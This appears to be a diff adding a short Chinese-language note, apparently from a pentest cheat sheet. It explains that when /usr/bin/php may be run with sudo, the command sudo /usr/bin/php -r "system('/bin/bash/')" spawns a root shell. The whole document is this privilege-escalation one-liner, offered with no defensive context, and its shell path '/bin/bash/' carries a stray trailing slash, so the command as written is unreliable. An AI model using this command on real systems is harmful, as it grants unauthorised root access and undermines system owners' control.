@@ -1,0 +1,3 @@
+当给了/usr/bin/php的root权限时
+
+在当前用户下使用sudo /usr/bin/php -r "system('/bin/bash/')"
